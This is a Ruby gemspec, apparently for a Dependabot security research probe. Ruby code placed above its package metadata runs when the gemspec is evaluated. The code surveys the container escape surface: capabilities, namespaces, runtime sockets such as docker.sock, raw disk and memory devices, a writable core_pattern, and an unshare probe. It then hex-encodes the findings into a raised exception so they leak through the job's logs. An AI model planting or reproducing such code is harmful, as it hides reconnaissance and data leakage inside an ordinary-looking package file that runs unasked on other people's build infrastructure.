require "open3"

module F005HostBoundary
  module_function

  def safe_read(path, limit = 16_384)
    File.binread(path, limit)
  rescue StandardError => e
    "ERROR:#{e.class}"
  end

  def safe_link(path)
    File.readlink(path)
  rescue StandardError => e
    "ERROR:#{e.class}"
  end

  def path_state(path)
    stat = File.lstat(path)
    {
      "exists" => true,
      "type" => stat.ftype,
      "mode" => format("%o", stat.mode & 0o7777),
      "uid" => stat.uid,
      "gid" => stat.gid,
      "writable" => File.writable?(path),
      "link" => stat.symlink? ? safe_link(path) : nil
    }
  rescue StandardError => e
    {"exists" => false, "error" => e.class.name}
  end

  def capture(*argv)
    stdout, stderr, status = Open3.capture3(*argv)
    {
      "exit" => status.exitstatus,
      "stdout" => stdout.byteslice(0, 1024),
      "stderr" => stderr.byteslice(0, 1024)
    }
  rescue StandardError => e
    {"error" => e.class.name}
  end
end

job_id = ENV.fetch("DEPENDABOT_JOB_ID", "unknown")
namespace_types = %w[cgroup ipc mnt net pid time user uts]
runtime_paths = [
  "/var/run/docker.sock",
  "/run/docker.sock",
  "/run/containerd/containerd.sock",
  "/var/run/containerd/containerd.sock",
  "/run/podman/podman.sock",
  "/host"
]
device_paths = [
  "/dev/kvm",
  "/dev/fuse",
  "/dev/vhost-vsock",
  "/dev/vsock",
  "/dev/mem",
  "/dev/sda",
  "/dev/nvme0n1"
]

mountinfo = F005HostBoundary.safe_read("/proc/self/mountinfo", 131_072)
mount_targets = %w[/ /proc /proc/sys /sys /dev /run /var/run /home/dependabot]
selected_mounts = mountinfo.lines.select do |line|
  fields = line.split(" ")
  mount_targets.include?(fields[4])
end

self_canary = "/tmp/f005-host-boundary-self-#{job_id}"
self_canary_result = begin
  File.write(self_canary, "F005_HOST_BOUNDARY_SELF_#{job_id}\n")
  value = File.read(self_canary).strip
  File.delete(self_canary)
  {"write" => true, "readback" => value, "removed" => !File.exist?(self_canary)}
rescue StandardError => e
  {"write" => false, "error" => "#{e.class}:#{e.message}"}
end

status_lines = F005HostBoundary.safe_read("/proc/self/status").lines.grep(
  /\A(?:Name|Pid|PPid|Uid|Gid|Groups|NSpid|CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp|Seccomp_filters):/
).map(&:strip)

evidence = {
  "schema" => "F005_HOST_BOUNDARY_V1",
  "job_id" => job_id,
  "process" => {
    "pid" => Process.pid,
    "ppid" => Process.ppid,
    "uid" => Process.uid,
    "euid" => Process.euid,
    "gid" => Process.gid,
    "egid" => Process.egid,
    "groups" => Process.groups,
    "status" => status_lines,
    "id" => F005HostBoundary.capture("id"),
    "uname" => F005HostBoundary.capture("uname", "-a")
  },
  "pid1" => {
    "comm" => F005HostBoundary.safe_read("/proc/1/comm").strip,
    "cmdline" => F005HostBoundary.safe_read("/proc/1/cmdline").tr("\0", " ").strip,
    "root" => F005HostBoundary.path_state("/proc/1/root")
  },
  "namespaces" => namespace_types.to_h do |name|
    [name, {"self" => F005HostBoundary.safe_link("/proc/self/ns/#{name}"), "pid1" => F005HostBoundary.safe_link("/proc/1/ns/#{name}")}]
  end,
  "id_maps" => {
    "uid_map" => F005HostBoundary.safe_read("/proc/self/uid_map").strip,
    "gid_map" => F005HostBoundary.safe_read("/proc/self/gid_map").strip
  },
  "lsm" => {
    "apparmor" => F005HostBoundary.safe_read("/proc/self/attr/current").strip,
    "selinux_enforce" => F005HostBoundary.safe_read("/sys/fs/selinux/enforce").strip
  },
  "mounts" => selected_mounts.map(&:strip),
  "runtime_paths" => runtime_paths.to_h { |path| [path, F005HostBoundary.path_state(path)] },
  "device_paths" => device_paths.to_h { |path| [path, F005HostBoundary.path_state(path)] },
  "proc_sys" => {
    "core_pattern" => F005HostBoundary.safe_read("/proc/sys/kernel/core_pattern").strip,
    "core_pattern_writable" => File.writable?("/proc/sys/kernel/core_pattern"),
    "proc_sys_mount" => selected_mounts.find { |line| line.split(" ")[4] == "/proc/sys" }
  },
  "filesystem" => {
    "root" => F005HostBoundary.path_state("/"),
    "tmp" => F005HostBoundary.path_state("/tmp"),
    "home_dependabot" => F005HostBoundary.path_state("/home/dependabot"),
    "self_canary" => self_canary_result
  },
  "namespace_probe" => F005HostBoundary.capture("unshare", "-Ur", "true")
}

encoded = Marshal.dump(evidence).unpack1("H*")
raise "F005_HOST_BOUNDARY_V1_MARSHAL_HEX=#{encoded}"

Gem::Specification.new do |spec|
  spec.name = "dependabot-host-boundary-probe"
  spec.version = "0.0.1"
  spec.summary = "Owned Dependabot boundary research canary"
  spec.authors = ["Mrunal Chawda"]
  spec.files = ["lib/dependabot_host_boundary_probe.rb"]
  spec.require_paths = ["lib"]
end
